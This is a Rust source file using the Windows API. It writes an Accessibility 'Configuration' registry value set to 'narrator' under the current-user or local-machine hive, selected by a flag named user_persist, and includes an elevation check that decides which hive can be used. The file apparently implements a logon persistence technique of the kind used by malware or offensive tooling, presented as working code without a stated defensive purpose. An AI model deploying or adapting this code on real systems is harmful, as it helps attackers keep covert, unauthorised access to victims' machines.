use std::{ffi::OsStr, io, iter::once, os::windows::ffi::OsStrExt, ptr};

use winapi::{
    shared::{minwindef::{DWORD, HKEY}, winerror::ERROR_SUCCESS}, 
    um::{
        processthreadsapi::{GetCurrentProcess, OpenProcessToken}, 
        securitybaseapi::GetTokenInformation, 
        winnt::{KEY_WRITE, REG_OPTION_NON_VOLATILE, REG_SZ, TOKEN_ELEVATION, TOKEN_QUERY, TokenElevation}, winreg::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, RegCloseKey, RegCreateKeyExW, RegSetValueExW}
    }
};

fn to_wide(s: &str) -> Vec<u16> {
    OsStr::new(s)
        .encode_wide()
        .chain(once(0))
        .collect()
}

pub fn reg_edit(user_persist: bool) -> io::Result<()> {
    unsafe {
        let subkey = to_wide(r"Software\Microsoft\Windows NT\CurrentVersion\Accessibility");
        let value_name = to_wide("Configuration");
        let data = to_wide("narrator");

        let hroot: HKEY = if user_persist {
            HKEY_CURRENT_USER
        } else {
            HKEY_LOCAL_MACHINE
        };

        let mut hkey: HKEY = ptr::null_mut();
        let mut disposition: DWORD = 0;

        let status = RegCreateKeyExW(
            hroot,
            subkey.as_ptr(),
            0,
            ptr::null_mut(),
            REG_OPTION_NON_VOLATILE,
            KEY_WRITE,
            ptr::null_mut(),
            &mut hkey,
            &mut disposition,
        );

        if status != ERROR_SUCCESS.try_into().unwrap() {
            return Err(io::Error::from_raw_os_error(status as i32));
        }

        let status = RegSetValueExW(
            hkey,
            value_name.as_ptr(),
            0,
            REG_SZ,
            data.as_ptr() as *const u8,
            (data.len() * 2) as u32, // size in bytes
        );

        RegCloseKey(hkey);

        if status != ERROR_SUCCESS.try_into().unwrap() {
            return Err(io::Error::from_raw_os_error(status as i32));
        }

        Ok(())
    }
}

pub fn is_elevated() -> bool {
    unsafe {
        let mut token = ptr::null_mut();
        let process = GetCurrentProcess();
        
        if OpenProcessToken(process, TOKEN_QUERY, &mut token) == 0 {
            return false;
        }
        
        let mut elevation = TOKEN_ELEVATION { TokenIsElevated: 0 };
        let mut return_length = 0 as DWORD;
        
        let result = GetTokenInformation(
            token,
            TokenElevation,
            &mut elevation as *mut _ as *mut _,
            std::mem::size_of::<TOKEN_ELEVATION>() as DWORD,
            &mut return_length,
        );
        
        winapi::um::handleapi::CloseHandle(token);
        
        if result != 0 {
            elevation.TokenIsElevated != 0
        } else {
            false
        }
    }
}